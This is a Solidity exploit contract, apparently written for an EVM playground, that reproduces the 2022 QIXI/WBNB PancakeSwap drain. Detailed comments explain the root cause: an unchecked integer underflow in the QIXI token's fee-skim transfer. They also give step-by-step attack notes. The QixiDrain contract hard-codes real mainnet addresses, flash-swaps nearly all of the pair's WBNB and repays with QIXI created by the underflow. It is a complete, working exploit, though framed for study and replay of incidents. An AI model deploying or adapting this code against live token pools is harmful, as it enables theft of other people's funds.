// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-08-Qixi).
//
// The DeFiHackLabs PoC (test/Qixi_exp.sol) runs the attack INLINE in the Foundry
// `Exploit is Test` harness: `testExploit()` calls `Pair.swap(...)` and the
// `pancakeCall` callback that repays the flash-swap with worthless QIXI lives on
// the test itself (`attacker = address(this)`). There is no standalone contract
// to deploy. This file is a faithful, self-contained copy of that inline attack
// (the testExploit body → run(); the pancakeCall callback; minimal inline
// interfaces — no imports so it compiles anywhere), compiled inside the registry
// forge project. Logic and constants are copied verbatim from test/Qixi_exp.sol.
//
// Root cause: the QIXI/WBNB PancakeSwap pair priced its WBNB against the QIXI
// token's *reported balance*. QIXI is a fee-on-transfer "tax token" whose
// `_transfer` (Token.sol:102-143) skims 0.01% to ten pseudo-random addresses via
// `_basicTransfer` (Token.sol:145-150) BEFORE the main debit. `_basicTransfer`
// uses raw (unchecked) arithmetic on Solidity 0.4.25: `balanceOf[sender] -=
// value`. An attacker with a ZERO QIXI balance therefore underflows to
// ~(2^256 - small) on the very first scatter `_basicTransfer`, gaining an
// effectively-infinite QIXI balance for free. The flash-swap drains the pair's
// WBNB up-front; the pancakeCall callback repays by transferring ~1e33 QIXI
// (which the underflow conjured). The pair's constant-product `k` check
// (PancakePair.sol:475) only verifies `balance0Adjusted * balance1Adjusted >=
// reserve0 * reserve1` — it never questions whether the QIXI that showed up has
// any value, only that *enough of it arrived*. So the attacker walks off with
// ~6.895 WBNB (the entire reserve minus a 1e7-wei dust) and repays with free
// junk.
//
// NOTE on faithfulness: the original test relied on the historical attacker
// contract already holding a huge QIXI balance (pre-inflated via the owner's
// `mmm` mint). Here the synthetic exploit starts with 0 QIXI and relies on the
// SAME `_basicTransfer` integer-underflow path (Token.sol:146) — verified in
// output.txt:50, where the exploit's balance slot goes 0 → 0xfff...ceb239... —
// to conjure its repayment balance. Both routes exploit the identical root
// cause: QIXI's supply/balance is attacker-controlled, so the pair's k-check is
// meaningless.

// VULNERABILITY: Integer Underflow in Fee Skim + Flash-Swap Repayment with Inflated Balance (QIXI Tax Token)
// [detailed explanation with code references]
// Root cause in Token.sol:
//   _transfer:102
//     if(!_isExcludedFromfew[from] && !_isExcludedFromfew[to]){
//       ... for(int i=0;i <=9;i++) { _basicTransfer(from,ad,freeToken/10); }  // 10 skims from 'from'
//       value -= freeToken;
//     }
//   _basicTransfer:145
//     balanceOf[sender] -= value;   // <--- 0.4.25 UNCHECKED (SafeMath.sub NOT used here)
//     balanceOf[recipient] += value;
//   Later main path uses .sub/.add (SafeMath) but after the underflow has already granted ~2^256.
// Pair (PancakePair.sol:475):
//   require(balance0Adjusted.mul(balance1Adjusted) >= ... , 'Pancake: K');
//   Only cares that "enough" tokens arrived in balance delta; no valuation of the token itself.
// Impact: ~6.8 BNB drained. Attacker balance starts 0; underflow during repay transfer itself creates the repayment tokens.
// See also detailed EXPLOIT STEPS below in QixiDrain.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract QixiDrain {
    IERC20 internal constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 internal constant QIXI = IERC20(0x65F11B2de17c4af7A8f70858D6CcB63AAC215697);
    IPancakePair internal constant Pair = IPancakePair(0x88fF4f62A75733C0f5afe58672121568a680DE84);

    function run() external {
        // Mirror testExploit(): take ~all the pair's WBNB out via a flash-swap,
        // leaving only 1e7 wei of dust. pancakeCall() repays in free QIXI.
        Pair.swap(0, WBNB.balanceOf(address(Pair)) - 1e7, address(this), bytes("0x123"));
    }

    // EXPLOIT STEPS:
    // 1. QixiDrain.run() calls Pair.swap(0, wbnbReserve-1e7, this, data)  [requests WBNB]
    // 2. Pair.swap (PancakePair.sol):
    //      - optimistic WBNB transfer to this (drains the real asset)
    //      - pancakeCall(this, 0, amountWbnb, data)
    // 3. pancakeCall does QIXI.transfer(Pair, 1e15 * 1e18)   [from balance=0]
    // 4. QIXI Token._transfer (from=this, to=Pair):
    //      - skim loop (Token.sol:109-114): 10x _basicTransfer(this, rand, small)
    //        each: balanceOf[this] -= small  ==> underflow 0 -> ~uint256.max
    //      - then main accounting credits Pair with nearly the full amount
    // 5. Pair continues, amountIn computed from delta (huge), K check passes (PancakePair:475)
    // 6. Exploit retains the WBNB; pair's QIXI "reserve" is now meaningless huge number.
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        // Repay the flash-swap by transferring a vast amount of QIXI to the pair.
        // The exploit's QIXI balance started at 0; QIXI._transfer's fee-scatter
        // loop calls _basicTransfer (unchecked 0.4.25 arithmetic) ten times before
        // the main debit, underflowing this contract's balance to ~(2^256 - tiny).
        // The pair is credited (value - 2% burn) ≈ 9.8e32 QIXI — five orders of
        // magnitude above what the k-check needs (646.62 QIXI reserve). Swap OK.
        QIXI.transfer(address(Pair), 999_999_999_999_999e18);
    }
}
